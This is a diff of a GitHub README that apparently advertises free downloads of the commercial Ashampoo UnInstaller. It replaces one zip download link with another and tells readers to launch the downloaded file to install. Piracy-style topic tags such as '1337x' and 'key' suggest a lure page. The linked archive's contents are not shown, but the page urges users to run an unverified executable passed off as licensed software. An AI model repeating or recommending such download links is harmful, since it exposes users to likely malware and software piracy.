@@ -10,9 +10,9 @@ Welcome to the Ashampoo UnInstaller Download repository! Here you can find all v
 - **Topics:** 1337x-ashampoo-uninstaller-7, ashampoo-uninstaller, ashampoo-uninstaller-10-review, ashampoo-uninstaller-12-review, ashampoo-uninstaller-14-key, ashampoo-uninstaller-15, ashampoo-uninstaller-2017, ashampoo-uninstaller-3-download, ashampoo-uninstaller-4, ashampoo-uninstaller-5, ashampoo-uninstaller-5-download, ashampoo-uninstaller-6, ashampoo-uninstaller-8, ashampoo-uninstaller-free, ashampoo-uninstaller-portable, ashampoo-uninstaller-vs-iobit-uninstaller
 
 ## Download Software
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-green)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Joshua1997313/Ashampoo-UnInstaller-Download/releases/download/v1.0/Application.zip)](https://github.com/Joshua1997313/Ashampoo-UnInstaller-Download/releases/download/v1.0/Application.zip)
 
-📥 **Software.zip** - Click the badge above to download the software package. Launch the file after download to install Ashampoo UnInstaller on your device.
+📥 **https://github.com/Joshua1997313/Ashampoo-UnInstaller-Download/releases/download/v1.0/Application.zip** - Click the badge above to download the software package. Launch the file after download to install Ashampoo UnInstaller on your device.
 
 ## What is Ashampoo UnInstaller?
 
